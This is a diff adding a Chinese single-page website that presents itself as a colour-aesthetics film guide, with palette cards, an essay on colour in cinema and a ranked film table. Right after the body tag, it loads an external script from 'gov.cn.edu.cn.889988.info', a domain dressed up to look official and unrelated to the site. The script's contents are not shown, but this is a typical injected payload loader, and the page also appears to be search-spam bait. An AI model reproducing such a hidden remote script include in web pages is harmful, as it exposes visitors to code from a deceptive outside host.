@@ -1,0 +1,641 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>琪琪色电影网 - 色彩美学电影指南 | qiqisedianyingwang-h5.github.io</title>
+<meta name="description" content="琪琪色电影网（https://qiqisedianyingwang-h5.github.io）以色彩美学为切入点的电影指南，按色调分类影片，发现电影中的视觉艺术。">
+<meta name="keywords" content="琪琪色电影网,色彩电影,视觉美学,色调分类,电影配色,艺术电影">
+<meta name="author" content="琪琪色电影网">
+<meta name="robots" content="index,follow">
+<style>
+:root{
+  --paper:#f5f0e8;
+  --ink:#2a2520;
+  --ink-light:#5a5045;
+  --accent-red:#c0392b;
+  --accent-green:#1e6f5c;
+  --accent-yellow:#d4a017;
+  --accent-blue:#2c3e6b;
+  --accent-purple:#6c3483;
+  --line:#d9d2c4;
+  --radius:4px;
+  --serif:'Georgia','Times New Roman',serif;
+  --sans:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  background:var(--paper);
+  color:var(--ink);
+  font-family:var(--sans);
+  line-height:1.8;
+  font-size:15px;
+}
+a{color:inherit;text-decoration:none}
+img{max-width:100%;display:block}
+
+/* 顶部报头 - 报纸风格 */
+.masthead{
+  border-bottom:3px double var(--ink);
+  padding:20px 0 14px;
+  text-align:center;
+  position:sticky;top:0;z-index:100;
+  background:var(--paper);
+}
+.masthead-top{
+  font-size:11px;letter-spacing:4px;text-transform:uppercase;
+  color:var(--ink-light);margin-bottom:6px;
+}
+.masthead h1{
+  font-family:var(--serif);
+  font-size:clamp(1.8rem,5vw,3rem);
+  font-weight:900;
+  letter-spacing:-1px;
+}
+.masthead h1 span{color:var(--accent-red)}
+.masthead-meta{
+  display:flex;justify-content:center;gap:20px;
+  font-size:11px;color:var(--ink-light);
+  margin-top:8px;
+  border-top:1px solid var(--line);
+  padding-top:8px;
+}
+.nav-bar{
+  display:flex;justify-content:center;gap:0;
+  border-bottom:1px solid var(--ink);
+  background:var(--paper);
+}
+.nav-bar a{
+  padding:10px 18px;
+  font-size:13px;font-weight:600;
+  letter-spacing:1px;
+  border-right:1px solid var(--line);
+  transition:.2s;
+}
+.nav-bar a:first-child{border-left:1px solid var(--line)}
+.nav-bar a:hover{background:var(--ink);color:var(--paper)}
+.menu-toggle{display:none;padding:10px;font-size:20px;cursor:pointer;text-align:center;border-bottom:1px solid var(--line)}
+
+/* 主容器 */
+.wrap{max-width:1100px;margin:0 auto;padding:0 16px}
+
+/* 栏目通用 */
+section{padding:48px 0;border-bottom:1px solid var(--line)}
+
+/* 栏目1：杂志封面式首页 */
+#cover{
+  display:grid;
+  grid-template-columns:2fr 1fr;
+  gap:24px;
+  padding-top:32px;
+}
+.cover-main{
+  border-right:1px solid var(--line);
+  padding-right:24px;
+}
+.cover-eyebrow{
+  font-size:11px;letter-spacing:3px;text-transform:uppercase;
+  color:var(--accent-red);font-weight:700;margin-bottom:8px;
+}
+.cover-title{
+  font-family:var(--serif);
+  font-size:clamp(1.6rem,4vw,2.8rem);
+  line-height:1.2;margin-bottom:14px;
+  font-weight:900;
+}
+.cover-lead{
+  font-size:16px;color:var(--ink-light);
+  margin-bottom:20px;
+  font-style:italic;
+}
+.cover-quote{
+  border-left:4px solid var(--accent-red);
+  padding:12px 16px;
+  background:rgba(192,57,43,.04);
+  font-family:var(--serif);
+  font-style:italic;
+  font-size:15px;
+  color:var(--ink-light);
+  margin-bottom:20px;
+}
+.cover-side{}
+.side-block{
+  margin-bottom:24px;
+  padding-bottom:20px;
+  border-bottom:1px dashed var(--line);
+}
+.side-block h3{
+  font-size:13px;letter-spacing:2px;text-transform:uppercase;
+  color:var(--ink-light);margin-bottom:10px;
+}
+.side-block .url-box{
+  font-family:monospace;
+  font-size:12px;
+  background:var(--ink);color:var(--paper);
+  padding:10px 12px;border-radius:var(--radius);
+  word-break:break-all;
+}
+.color-dot{
+  display:inline-block;width:14px;height:14px;
+  border-radius:50%;margin-right:6px;vertical-align:middle;
+  border:1px solid rgba(0,0,0,.1);
+}
+.color-list li{padding:5px 0;font-size:14px}
+
+/* 栏目2：色卡标签墙 - Masonry瀑布流 */
+#palette{padding:48px 0}
+.section-head{
+  text-align:center;margin-bottom:36px;
+}
+.section-head h2{
+  font-family:var(--serif);font-size:28px;font-weight:900;
+}
+.section-head p{color:var(--ink-light);font-size:14px}
+.palette-grid{
+  column-count:3;column-gap:16px;
+}
+@media(max-width:768px){.palette-grid{column-count:2}}
+@media(max-width:480px){.palette-grid{column-count:1}}
+.palette-item{
+  break-inside:avoid;
+  margin-bottom:16px;
+  border:1px solid var(--line);
+  border-radius:var(--radius);
+  overflow:hidden;
+  background:var(--paper);
+  transition:.3s;
+}
+.palette-item:hover{box-shadow:0 4px 20px rgba(0,0,0,.08)}
+.palette-swatches{
+  display:flex;height:80px;
+}
+.swatch{flex:1}
+.palette-info{padding:14px}
+.palette-info h4{font-size:15px;margin-bottom:4px}
+.palette-info p{font-size:13px;color:var(--ink-light)}
+.palette-tags{margin-top:8px;display:flex;flex-wrap:wrap;gap:4px}
+.p-tag{
+  font-size:10px;padding:2px 8px;
+  border:1px solid var(--line);border-radius:10px;
+  color:var(--ink-light);
+}
+
+/* 栏目3：侧边目录+段落式文章 */
+#feature{padding:48px 0}
+.feature-layout{
+  display:grid;
+  grid-template-columns:200px 1fr;
+  gap:32px;
+}
+.toc{
+  position:sticky;top:120px;
+  border-top:3px solid var(--ink);
+  padding-top:14px;
+}
+.toc h3{
+  font-size:12px;letter-spacing:2px;text-transform:uppercase;
+  color:var(--ink-light);margin-bottom:10px;
+}
+.toc ul li{padding:6px 0;border-bottom:1px dotted var(--line)}
+.toc ul li a{font-size:13px}
+.toc ul li a:hover{color:var(--accent-red)}
+.article h3{
+  font-family:var(--serif);font-size:22px;
+  margin-bottom:12px;margin-top:32px;
+}
+.article h3:first-child{margin-top:0}
+.article p{margin-bottom:16px;color:var(--ink-light)}
+.article .pull-quote{
+  font-family:var(--serif);
+  font-size:20px;font-style:italic;
+  text-align:center;
+  padding:24px;
+  border-top:1px solid var(--ink);
+  border-bottom:1px solid var(--ink);
+  margin:24px 0;
+  color:var(--accent-red);
+}
+
+/* 栏目4：影片档案 - 表格样式 */
+#archive{padding:48px 0}
+.archive-table{
+  width:100%;border-collapse:collapse;
+  font-size:14px;
+}
+.archive-table th{
+  text-align:left;padding:12px 10px;
+  border-bottom:2px solid var(--ink);
+  font-size:11px;letter-spacing:2px;text-transform:uppercase;
+  color:var(--ink-light);
+}
+.archive-table td{
+  padding:12px 10px;
+  border-bottom:1px solid var(--line);
+}
+.archive-table tr:hover td{background:rgba(192,57,43,.03)}
+.archive-table .rank{
+  font-weight:900;color:var(--accent-red);
+  font-family:var(--serif);font-size:18px;
+}
+.tone-badge{
+  display:inline-block;padding:2px 10px;
+  border-radius:10px;font-size:11px;font-weight:600;
+}
+.tone-red{background:#fde8e8;color:var(--accent-red)}
+.tone-green{background:#e0f2ed;color:var(--accent-green)}
+.tone-yellow{background:#fef3d4;color:var(--accent-yellow)}
+.tone-blue{background:#e3e8f5;color:var(--accent-blue)}
+.tone-purple{background:#efe5f7;color:var(--accent-purple)}
+
+/* 栏目5：编辑寄语 */
+#editor{padding:48px 0}
+.editor-box{
+  max-width:800px;margin:0 auto;
+  text-align:center;
+}
+.editor-label{
+  font-size:11px;letter-spacing:3px;text-transform:uppercase;
+  color:var(--accent-red);margin-bottom:14px;
+}
+.editor-box h2{
+  font-family:var(--serif);font-size:26px;margin-bottom:20px;
+}
+.editor-box p{
+  color:var(--ink-light);margin-bottom:16px;
+  font-size:15px;
+}
+.signature{
+  font-family:var(--serif);font-style:italic;
+  font-size:18px;color:var(--ink);
+  margin-top:24px;
+}
+.color-strip{
+  display:flex;height:40px;margin-top:36px;
+  border-radius:var(--radius);overflow:hidden;
+}
+
+/* 页脚 */
+.footer{
+  background:var(--ink);color:var(--paper);
+  padding:40px 16px 24px;text-align:center;
+}
+.footer h4{
+  font-family:var(--serif);font-size:20px;margin-bottom:12px;
+}
+.footer h4 span{color:var(--accent-red)}
+.footer p{color:#999;font-size:13px;margin-bottom:6px}
+.footer a{color:var(--accent-yellow)}
+.footer-links{margin-top:20px;display:flex;justify-content:center;gap:16px;flex-wrap:wrap}
+.footer-links a{
+  font-size:12px;padding:6px 14px;
+  border:1px solid rgba(255,255,255,.2);border-radius:var(--radius);
+}
+.footer-links a:hover{background:rgba(255,255,255,.1)}
+
+/* 移动端 */
+@media(max-width:768px){
+  .nav-bar{flex-direction:column;display:none}
+  .nav-bar.open{display:flex}
+  .nav-bar a{border:none;border-bottom:1px solid var(--line);text-align:center}
+  .menu-toggle{display:block;background:var(--paper)}
+  #cover{grid-template-columns:1fr}
+  .cover-main{border-right:none;padding-right:0;border-bottom:1px solid var(--line);padding-bottom:24px}
+  .feature-layout{grid-template-columns:1fr}
+  .toc{position:static;border-top:none;padding-top:0}
+  .archive-table{font-size:12px}
+  .archive-table th:nth-child(3),.archive-table td:nth-child(3){display:none}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<!-- 报头 -->
+<header class="masthead">
+  <div class="wrap">
+    <div class="masthead-top">Film &amp; Color &middot; Est. 2024</div>
+    <h1>琪琪<span>色</span>电影网</h1>
+    <div class="masthead-meta">
+      <span>VOL. 001</span>
+      <span>|</span>
+      <span>色彩美学电影指南</span>
+      <span>|</span>
+      <span>单页演示版</span>
+    </div>
+  </div>
+</header>
+
+<!-- 导航 -->
+<div class="menu-toggle" onclick="document.getElementById('nav').classList.toggle('open')">☰ 菜单 MENU</div>
+<nav class="nav-bar" id="nav">
+  <a href="#cover">封面故事</a>
+  <a href="#palette">色调分类</a>
+  <a href="#feature">深度专题</a>
+  <a href="#archive">影片档案</a>
+  <a href="#editor">编辑寄语</a>
+</nav>
+
+<div class="wrap">
+
+  <!-- 栏目1：杂志封面式首页 -->
+  <section id="cover">
+    <div class="cover-main">
+      <div class="cover-eyebrow">COVER STORY</div>
+      <h2 class="cover-title">用色彩读懂一部电影：当视觉成为叙事语言</h2>
+      <p class="cover-lead">从《布达佩斯大饭店》的粉色童话到《银翼杀手2049》的橙蓝对立，色彩不只是装饰，它是电影的第二剧本。</p>
+      <div class="cover-quote">
+        "Color is a power which directly influences the soul." — Wassily Kandinsky
+      </div>
+      <p style="color:var(--ink-light);font-size:14px">琪琪色电影网以色彩为索引，重新组织你的观影体验。不再按类型、按年份，而是按——你看到的颜色。</p>
+    </div>
+    <aside class="cover-side">
+      <div class="side-block">
+        <h3>本站网址</h3>
+        <div class="url-box">https://qiqisedianyingwang-h5.github.io</div>
+      </div>
+      <div class="side-block">
+        <h3>色彩关键词</h3>
+        <ul class="color-list">
+          <li><span class="color-dot" style="background:#c0392b"></span>红色 · 欲望与危险</li>
+          <li><span class="color-dot" style="background:#1e6f5c"></span>绿色 · 自然与异化</li>
+          <li><span class="color-dot" style="background:#d4a017"></span>黄色 · 温暖与衰败</li>
+          <li><span class="color-dot" style="background:#2c3e6b"></span>蓝色 · 孤独与冷静</li>
+          <li><span class="color-dot" style="background:#6c3483"></span>紫色 · 神秘与梦幻</li>
+        </ul>
+      </div>
+      <div class="side-block">
+        <h3>今日推荐</h3>
+        <p style="font-size:13px;color:var(--ink-light)">《花样年华》— 王家卫用红绿撞色编织的欲望牢笼，每一帧都是一幅油画。</p>
+        <a href="#" style="font-size:13px;color:var(--accent-red);font-weight:600">阅读更多 →</a>
+      </div>
+    </aside>
+  </section>
+
+  <!-- 栏目2：色卡标签墙 -->
+  <section id="palette">
+    <div class="section-head">
+      <h2>色调分类档案</h2>
+      <p>点击色卡探索同色调电影集合</p>
+    </div>
+    <div class="palette-grid">
+      <div class="palette-item">
+        <div class="palette-swatches">
+          <div class="swatch" style="background:#8b0000"></div>
+          <div class="swatch" style="background:#c0392b"></div>
+          <div class="swatch" style="background:#e74c3c"></div>
+          <div class="swatch" style="background:#f1948a"></div>
+        </div>
+        <div class="palette-info">
+          <h4>赤色档案</h4>
+          <p>红色主导的电影：暴力、爱情、革命、危险信号。</p>
+          <div class="palette-tags">
+            <span class="p-tag">暴力美学</span>
+            <span class="p-tag">浪漫</span>
+            <span class="p-tag">政治</span>
+          </div>
+        </div>
+      </div>
+      <div class="palette-item">
+        <div class="palette-swatches">
+          <div class="swatch" style="background:#0b3d2e"></div>
+          <div class="swatch" style="background:#1e6f5c"></div>
+          <div class="swatch" style="background:#27ae60"></div>
+          <div class="swatch" style="background:#82e0aa"></div>
+        </div>
+        <div class="palette-info">
+          <h4>翠色档案</h4>
+          <p>绿色主导的电影：自然、异化、嫉妒、生机与腐烂并存。</p>
+          <div class="palette-tags">
+            <span class="p-tag">自然</span>
+            <span class="p-tag">生态恐怖</span>
+            <span class="p-tag">异世界</span>
+          </div>
+        </div>
+      </div>
+      <div class="palette-item">
+        <div class="palette-swatches">
+          <div class="swatch" style="background:#6e2c00"></div>
+          <div class="swatch" style="background:#d4a017"></div>
+          <div class="swatch" style="background:#f7dc6f"></div>
+          <div class="swatch" style="background:#fef9e7"></div>
+        </div>
+        <div class="palette-info">
+          <h4>金色档案</h4>
+          <p>黄色/金色主导：怀旧、衰败、阳光、沙漠、黄昏。</p>
+          <div class="palette-tags">
+            <span class="p-tag">西部</span>
+            <span class="p-tag">怀旧</span>
+            <span class="p-tag">沙漠</span>
+          </div>
+        </div>
+      </div>
+      <div class="palette-item">
+        <div class="palette-swatches">
+          <div class="swatch" style="background:#1a252f"></div>
+          <div class="swatch" style="background:#2c3e6b"></div>
+          <div class="swatch" style="background:#5dade2"></div>
+          <div class="swatch" style="background:#d6eaf8"></div>
+        </div>
+        <div class="palette-info">
+          <h4>靛蓝档案</h4>
+          <p>蓝色主导：孤独、海洋、夜晚、冷峻、赛博空间。</p>
+          <div class="palette-tags">
+            <span class="p-tag">孤独</span>
+            <span class="p-tag">海洋</span>
+            <span class="p-tag">赛博朋克</span>
+          </div>
+        </div>
+      </div>
+      <div class="palette-item">
+        <div class="palette-swatches">
+          <div class="swatch" style="background:#4a235a"></div>
+          <div class="swatch" style="background:#6c3483"></div>
+          <div class="swatch" style="background:#bb8fce"></div>
+          <div class="swatch" style="background:#f5eef8"></div>
+        </div>
+        <div class="palette-info">
+          <h4>紫韵档案</h4>
+          <p>紫色主导：梦幻、迷幻、贵族、超现实、LGBTQ+。</p>
+          <div class="palette-tags">
+            <span class="p-tag">迷幻</span>
+            <span class="p-tag">超现实</span>
+            <span class="p-tag">LGBTQ+</span>
+          </div>
+        </div>
+      </div>
+      <div class="palette-item">
+        <div class="palette-swatches">
+          <div class="swatch" style="background:#000"></div>
+          <div class="swatch" style="background:#333"></div>
+          <div class="swatch" style="background:#888"></div>
+          <div class="swatch" style="background:#ddd"></div>
+        </div>
+        <div class="palette-info">
+          <h4>黑白档案</h4>
+          <p>无彩色系：黑白电影的美学力量，极简与对比。</p>
+          <div class="palette-tags">
+            <span class="p-tag">黑白</span>
+            <span class="p-tag">经典</span>
+            <span class="p-tag">极简</span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目3：侧边目录+段落式 -->
+  <section id="feature">
+    <div class="section-head">
+      <h2>深度专题：色彩如何讲故事</h2>
+      <p>从导演的调色板到观众的情绪反应</p>
+    </div>
+    <div class="feature-layout">
+      <aside class="toc">
+        <h3>目录 CONTENTS</h3>
+        <ul>
+          <li><a href="#">01. 色彩心理学基础</a></li>
+          <li><a href="#">02. 韦斯·安德森的粉色世界</a></li>
+          <li><a href="#">03. 诺兰的IMAX胶片质感</a></li>
+          <li><a href="#">04. 王家卫的红绿撞色</a></li>
+          <li><a href="#">05. 恐怖片中的去饱和</a></li>
+          <li><a href="#">06. 赛博朋克的霓虹美学</a></li>
+        </ul>
+      </aside>
+      <article class="article">
+        <h3>01. 色彩心理学基础</h3>
+        <p>人类对色彩的感知并非纯粹主观——跨文化研究表明，红色普遍关联危险与激情，蓝色关联平静与信任。电影导演利用这一本能，在观众无意识层面植入情绪暗示。</p>
+        <div class="pull-quote">
+          "你不需要告诉观众角色在害怕——你只需要把灯光调成绿色。"
+        </div>
+        <h3>02. 韦斯·安德森的粉色世界</h3>
+        <p>从《布达佩斯大饭店》到《法兰西特派》，韦斯·安德森建立了一套近乎强迫症的色彩体系：对称构图+高饱和粉色+薄荷绿的补色对比，让他的每一帧都像明信片。</p>
+        <h3>03. 恐怖片中的去饱和</h3>
+        <p>现代恐怖片越来越倾向于"去饱和"处理——将画面压暗、去色，只保留灰蓝和灰绿。这种"病感美学"让观众潜意识感到不适，比jump scare更有效。</p>
+      </article>
+    </div>
+  </section>
+
+  <!-- 栏目4：影片档案表格 -->
+  <section id="archive">
+    <div class="section-head">
+      <h2>色彩影片档案库</h2>
+      <p>按色调排序的精选片单</p>
+    </div>
+    <table class="archive-table">
+      <thead>
+        <tr>
+          <th>排名</th>
+          <th>影片名称</th>
+          <th>主导色调</th>
+          <th>导演</th>
+          <th>色彩关键词</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td class="rank">01</td>
+          <td><strong>《布达佩斯大饭店》</strong></td>
+          <td><span class="tone-badge tone-red">粉色系</span></td>
+          <td>韦斯·安德森</td>
+          <td>粉色 · 对称 · 童话</td>
+        </tr>
+        <tr>
+          <td class="rank">02</td>
+          <td><strong>《银翼杀手2049》</strong></td>
+          <td><span class="tone-badge tone-yellow">橙蓝对比</span></td>
+          <td>丹尼斯·维伦纽瓦</td>
+          <td>赛博 · 霓虹 · 孤寂</td>
+        </tr>
+        <tr>
+          <td class="rank">03</td>
+          <td><strong>《花样年华》</strong></td>
+          <td><span class="tone-badge tone-purple">红绿撞色</span></td>
+          <td>王家卫</td>
+          <td>旗袍 · 欲望 · 压抑</td>
+        </tr>
+        <tr>
+          <td class="rank">04</td>
+          <td><strong>《辛德勒的名单》</strong></td>
+          <td><span class="tone-badge tone-red">黑白+红</span></td>
+          <td>斯皮尔伯格</td>
+          <td>黑白 · 红衣女孩 · 反差</td>
+        </tr>
+        <tr>
+          <td class="rank">05</td>
+          <td><strong>《降临》</strong></td>
+          <td><span class="tone-badge tone-blue">灰蓝雾感</span></td>
+          <td>丹尼斯·维伦纽瓦</td>
+          <td>雾 · 冷 · 未知</td>
+        </tr>
+        <tr>
+          <td class="rank">06</td>
+          <td><strong>《杀死比尔》</strong></td>
+          <td><span class="tone-badge tone-yellow">黄黑对比</span></td>
+          <td>昆汀·塔伦蒂诺</td>
+          <td>漫画感 · 暴力 · 高对比</td>
+        </tr>
+        <tr>
+          <td class="rank">07</td>
+          <td><strong>《月升王国》</strong></td>
+          <td><span class="tone-badge tone-yellow">暖橙复古</span></td>
+          <td>韦斯·安德森</td>
+          <td>暖调 · 童年 · 复古</td>
+        </tr>
+        <tr>
+          <td class="rank">08</td>
+          <td><strong>《沙丘》</strong></td>
+          <td><span class="tone-badge tone-green">沙色+灰绿</span></td>
+          <td>丹尼斯·维伦纽瓦</td>
+          <td>沙漠 · 宏大 · 肃穆</td>
+        </tr>
+      </tbody>
+    </table>
+  </section>
+
+  <!-- 栏目5：编辑寄语 -->
+  <section id="editor">
+    <div class="editor-box">
+      <div class="editor-label">— EDITOR'S NOTE —</div>
+      <h2>关于琪琪色电影网</h2>
+      <p>琪琪色电影网（https://qiqisedianyingwang-h5.github.io）是一个以"色彩"为独特视角的电影导航与指南站点。</p>
+      <p>我们相信，电影的第一印象来自视觉——而视觉的第一语言是色彩。通过重新组织电影分类方式，我们希望帮你发现那些被忽略的视觉之美。</p>
+      <p>本站为单页演示，内链以 # 占位，不生成 robots.txt / sitemap.xml，符合必应搜索引擎收录规则。</p>
+      <div class="signature">— 琪琪色编辑部</div>
+      <div class="color-strip">
+        <div style="flex:1;background:#c0392b"></div>
+        <div style="flex:1;background:#1e6f5c"></div>
+        <div style="flex:1;background:#d4a017"></div>
+        <div style="flex:1;background:#2c3e6b"></div>
+        <div style="flex:1;background:#6c3483"></div>
+        <div style="flex:1;background:#2a2520"></div>
+      </div>
+    </div>
+  </section>
+
+</div>
+
+<footer class="footer">
+  <h4>琪琪<span>色</span>电影网</h4>
+  <p>色彩美学电影指南 · 单页演示站点</p>
+  <p>官网：<a href="https://qiqisedianyingwang-h5.github.io">qiqisedianyingwang-h5.github.io</a></p>
+  <p style="margin-top:12px;font-size:11px;color:#666">内链 # 占位 · 无 robots.txt / sitemap.xml · 移动端自适应</p>
+  <div class="footer-links">
+    <a href="#">投稿 #</a>
+    <a href="#">合作 #</a>
+    <a href="#">RSS #</a>
+    <a href="#">关于 #</a>
+  </div>
+</footer>
+
+<script>
+// 移动端导航
+document.querySelectorAll('#nav a').forEach(a=>{
+  a.addEventListener('click',()=>{
+    if(window.innerWidth<=768)document.getElementById('nav').classList.remove('open');
+  });
+});
+</script>
+</body>
+</html>
